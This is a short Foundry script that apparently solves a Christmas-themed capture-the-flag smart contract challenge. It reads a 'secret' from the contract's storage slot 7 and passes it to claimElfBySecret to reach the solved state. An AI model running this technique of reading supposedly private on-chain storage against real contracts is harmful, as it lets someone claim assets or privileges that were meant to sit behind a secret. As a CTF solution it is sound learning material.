// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";

interface Xmas {
    function claimElfBySecret(string calldata _name, bytes32 _guess) external;
    function isSolved() external view returns (bool);
}

contract Solve is Script {

    address constant CHALL = 0x5D22294FC27C4802B3156632f7710856Fb89CF0B;

    function run() external {
        uint256 santaKey = vm.envUint("PRIVATE_KEY"); // load from env
        vm.startBroadcast(santaKey);

        // Read storage slot 7 → contains bytes32 secret
        bytes32 secret = vm.load(CHALL, bytes32(uint256(7)));
        console.logBytes32(secret);

        Xmas x = Xmas(CHALL);
        x.claimElfBySecret("h4x0r-elf", secret);

        bool ok = x.isSolved();
        console.log("Solved:", ok);

        vm.stopBroadcast();
    }
}
